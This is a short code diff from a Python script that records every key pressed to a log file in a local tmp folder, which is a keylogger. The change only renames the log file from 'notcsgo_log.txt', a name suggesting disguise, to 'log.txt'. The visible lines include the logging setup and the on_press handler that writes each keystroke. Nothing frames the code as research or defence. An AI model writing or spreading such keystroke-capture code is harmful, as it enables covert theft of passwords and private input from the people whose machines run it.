@@ -8,7 +8,7 @@ p.mkdir(exist_ok=True)
     
 log_dir = ".\\tmp\\"
 
-logging.basicConfig(filename=(log_dir + "notcsgo_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
         logging.info(str(key))
